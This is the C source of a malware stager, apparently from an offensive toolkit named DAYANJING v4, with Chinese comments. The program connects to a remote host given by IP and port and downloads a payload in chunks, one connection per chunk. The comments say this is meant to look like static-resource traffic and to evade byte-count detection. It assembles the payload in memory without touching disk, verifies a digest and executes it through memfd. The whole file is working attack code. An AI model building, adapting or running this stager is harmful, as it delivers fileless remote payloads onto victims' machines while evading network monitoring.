/* DAYANJING v4 — 25_deploy / src/drop_stager.c
 *
 * stager：落在目标上的那一小段。它不含制品，只含 manifest
 * （分块索引 + 整体摘要），因此体积极小。
 *
 * manifest 内置而非从服务端拉取，是有意的：
 *   服务端只提供块，stager 用内置摘要校验收齐的内容。
 *   这样即便投递点被劫持，也投不出别的制品 —— 摘要不符即拒绝执行。
 *   这是供应链防护，不是可选的加固项。
 *
 * 流程：逐块拉取（每块一个连接，形态与真实静态资源一致）
 *       → 内存组装（不落盘）→ 摘要校验 → 解包 → memfd 执行。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "drop.h"
#include "drop_http.h"

#define STAGER_IOBUF (DP_CHUNK_MAX + 1024)

static int read_file(const char *path, uint8_t *buf, size_t cap, size_t *len)
{
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    size_t n = fread(buf, 1, cap, f);
    int bad = ferror(f);
    fclose(f);
    if (bad) return -1;
    *len = n;
    return 0;
}

/* 连一次、拉一块、断一次。
   长连接拉全部块会让单个连接的字节数等于制品大小，
   那正是分块想要消除的特征。 */
static int fetch_chunk(const char *ip, uint16_t port, uint32_t idx,
                       uint8_t *resp, size_t resp_cap, size_t *rlen)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) { close(fd); return -1; }

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd); return -1;
    }

    char req[256];
    size_t rlen_req = 0;
    if (dp_http_build_request(idx, NULL, req, sizeof(req), &rlen_req) != DP_OK) {
        close(fd); return -1;
    }

    /* 简单写：请求很小，一次 write 足够；失败即返回，不做部分写重试。 */
    if (write(fd, req, rlen_req) != (ssize_t)rlen_req) { close(fd); return -1; }

    size_t off = 0;
    for (;;) {
        if (off >= resp_cap) { close(fd); return -1; }
        ssize_t n = read(fd, resp + off, resp_cap - off);
        if (n < 0) { close(fd); return -1; }
        if (n == 0) break;                   /* 对端关闭：响应收完 */
        off += (size_t)n;
    }
    close(fd);
    *rlen = off;
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 5) {
        fprintf(stderr, "usage: %s <ip> <port> <manifest.bin> <seed.bin>\n", argv[0]);
        return 2;
    }

    const char *ip = argv[1];
    long p = strtol(argv[2], NULL, 10);
    if (p <= 0 || p > 65535) { fprintf(stderr, "bad port\n"); return 2; }
    uint16_t port = (uint16_t)p;

    /* manifest 与 seed 从文件读入。
       真实部署时它们作为资源嵌进 stager，这里走文件是为了
       让同一份 stager 能投不同制品、且测试可断言。 */
    uint8_t mbuf[sizeof(dp_manifest_t)];
    size_t mlen = 0;
    if (read_file(argv[3], mbuf, sizeof(mbuf), &mlen) != 0 ||
        mlen != sizeof(dp_manifest_t)) {
        fprintf(stderr, "read manifest failed\n");
        return 2;
    }

    uint8_t seed[32];
    size_t slen = 0;
    if (read_file(argv[4], seed, sizeof(seed), &slen) != 0 || slen == 0) {
        fprintf(stderr, "read seed failed\n");
        return 2;
    }

    dp_manifest_t m;
    memcpy(&m, mbuf, sizeof(m));
    if (dp_manifest_check(&m) != DP_OK) {
        fprintf(stderr, "manifest invalid\n");
        return 2;
    }

    dp_asm_t a;
    if (dp_asm_init(&a, &m) != DP_OK) {
        fprintf(stderr, "asm init failed\n");
        return 2;
    }

    uint8_t *resp = malloc(STAGER_IOBUF);
    if (!resp) { dp_asm_free(&a); return 2; }

    int fail = 0;
    for (uint32_t i = 0; i < m.nchunks; i++) {
        size_t rlen = 0;
        if (fetch_chunk(ip, port, i, resp, STAGER_IOBUF, &rlen) != 0) {
            fprintf(stderr, "fetch chunk %u: transport fail\n", i);
            fail = 1; break;
        }
        const uint8_t *body = NULL;
        size_t blen = 0;
        if (dp_http_parse_response(resp, rlen, &body, &blen) != DP_OK) {
            fprintf(stderr, "chunk %u: bad response\n", i);
            fail = 1; break;
        }
        int rc = dp_asm_put(&a, i, body, blen);
        if (rc != DP_OK && rc != DP_ERR_DUP) {
            fprintf(stderr, "chunk %u: put rc=%d\n", i, rc);
            fail = 1; break;
        }
    }

    if (!fail) {
        int rc = dp_asm_seal(&a);
        if (rc != DP_OK) {
            fprintf(stderr, "seal rc=%d (missing=%u)\n", rc, dp_asm_missing(&a));
            fail = 1;
        }
    }

    if (fail) {
        free(resp);
        dp_asm_free(&a);
        return 1;
    }

    fprintf(stderr, "stager: sealed %u bytes, exec\n", a.len);
    free(resp);

    /* 执行成功时进程映像被替换，不返回。 */
    int rc = dp_asm_exec(&a, seed, slen);
    dp_asm_free(&a);
    fprintf(stderr, "exec rc=%d\n", rc);
    return 1;
}
